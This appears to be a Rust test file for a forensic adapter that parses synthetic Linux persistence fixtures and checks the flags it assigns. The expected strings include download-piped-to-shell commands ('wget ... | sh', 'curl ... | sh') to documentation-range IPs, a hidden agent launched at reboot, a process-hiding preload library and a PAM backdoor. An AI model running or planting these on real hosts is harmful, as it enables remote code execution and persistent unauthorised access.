//! The persistence adapter on the `persistence` crate's synthetic attack
//! files (`tests/fixtures/persistence/`, laid out as on the host): the
//! contract, recognition by path, entries with what runs and as whom, the
//! file's time, and flags.

use common::time::Ts;
use conformance::assert_conforms;
use model::adapter::{Adapter, Collected, Confidence, Input};
use model::{EvidenceId, Record, TimeKind, Value};
use sootmark_adapters::persistence::{PersistenceAdapter, NAMESPACE};

fn read(path: &str) -> Vec<u8> {
    std::fs::read(format!(
        "{}/tests/fixtures/persistence/{path}",
        env!("CARGO_MANIFEST_DIR")
    ))
    .unwrap()
}

fn parse(path: &str) -> Vec<Record> {
    let data = read(path);
    let input = Input {
        evidence: EvidenceId::of_content(&data),
        name: path,
        data: &data,
        modified: Some(Ts::from_unix_seconds(1_790_000_000)),
    };
    let mut sink = Collected::default();
    PersistenceAdapter
        .parse(&input, &mut sink)
        .expect("entries");
    sink.records
}

#[test]
fn conforms_and_probes_by_path() {
    for path in [
        "etc/crontab",
        "var/spool/cron/crontabs/alice",
        "etc/systemd/system/sysupdate.service",
        "home/alice/.ssh/authorized_keys",
        "etc/ld.so.preload",
        "etc/sudoers.d/90-backdoor",
    ] {
        assert_conforms(&PersistenceAdapter, path, &read(path));
    }
    // The host path, as intake gives it.
    assert_eq!(
        PersistenceAdapter.probe("/var/spool/cron/crontabs/alice", b""),
        Confidence::Certain
    );
    assert_eq!(
        PersistenceAdapter.probe("alice", b""),
        Confidence::No,
        "a bare name says nothing"
    );
    assert_eq!(PersistenceAdapter.probe("/etc/hosts", b""), Confidence::No);
}

#[test]
fn entries_flags_and_times() {
    let cron = parse("etc/cron.d/sysupdate");
    let job = &cron[0];
    assert_eq!(job.namespace(), NAMESPACE);
    assert_eq!(job.facets.user_name.as_deref(), Some("root"));
    assert!(job.summary.contains("flags:"), "{}", job.summary);
    assert!(matches!(job.fields.get("Flags"), Some(Value::Text(f)) if f.contains("base64")));
    assert_eq!(job.times[0].kind, TimeKind::Modified);

    let user = parse("var/spool/cron/crontabs/alice");
    let reboot = user
        .iter()
        .find(|r| r.fields.get("Schedule") == Some(&Value::from("@reboot")))
        .unwrap();
    assert_eq!(
        reboot.facets.user_name.as_deref(),
        Some("alice"),
        "the spool file's name"
    );
    assert!(reboot
        .facets
        .process_command_line
        .as_deref()
        .unwrap()
        .starts_with("nohup /var/tmp/.cache/agent"));

    let keys = parse("home/alice/.ssh/authorized_keys");
    assert!(keys.iter().all(
        |k| matches!(k.fields.get("Fingerprint"), Some(Value::Text(f)) if f.starts_with("SHA256:"))
    ));

    let preload = parse("etc/ld.so.preload");
    assert_eq!(
        preload[0].facets.process_command_line.as_deref(),
        Some("/usr/local/lib/libprocesshider.so")
    );
    assert!(preload[0].summary.contains("flags:"));
}

#[test]
fn at_jobs_pam_and_sshd() {
    let at = parse("var/spool/cron/atjobs/a0000201c79c28");
    assert_eq!(
        at[0].summary,
        "at 2026-10-09T07:36Z as alice: wget -qO- http://203.0.113.40/u | sh (flags: download piped to a shell)"
    );
    assert_eq!(at[0].fields.get("Uid"), Some(&Value::UInt(1001)));
    assert_eq!(at[0].fields.get("Queue"), Some(&Value::from("a")));

    let pam = parse("etc/pam.d/sshd");
    assert_eq!(
        pam[0].fields.get("Module"),
        Some(&Value::from("pam_permit.so"))
    );
    assert_eq!(
        pam[0].fields.get("Flags"),
        Some(&Value::from("PAM accepts any password"))
    );

    let sshd = parse("etc/ssh/sshd_config.d/99-tuning.conf");
    assert_eq!(
        sshd[3].fields.get("Match"),
        Some(&Value::from("User backup"))
    );
    assert_eq!(
        sshd[3].facets.process_command_line.as_deref(),
        Some("/usr/local/bin/rrsync -ro /srv")
    );

    let init = parse("etc/init.d/sysupdate");
    assert!(init
        .iter()
        .all(|r| r.facets.user_name.as_deref() == Some("root")));
}

#[test]
fn udev_autostart_and_modprobe() {
    let udev = parse("etc/udev/rules.d/99-usb-sync.rules");
    assert_eq!(
        udev[0].facets.process_command_line.as_deref(),
        Some("/bin/sh -c 'curl -s http://198.51.100.23/s | sh'")
    );
    assert_eq!(udev[0].fields.get("Kind"), Some(&Value::from("udev rule")));

    let autostart = parse("home/alice/.config/autostart/tracker-extract.desktop");
    assert_eq!(autostart[0].facets.user_name.as_deref(), Some("alice"));
    assert_eq!(
        autostart[0].fields.get("Disabled"),
        Some(&Value::Bool(false))
    );

    let modprobe = parse("etc/modprobe.d/blacklist-local.conf");
    assert_eq!(modprobe[2].fields.get("Module"), Some(&Value::from("ext4")));
    assert_eq!(
        modprobe[2].fields.get("Flags"),
        Some(&Value::from("modprobe runs a command"))
    );
}
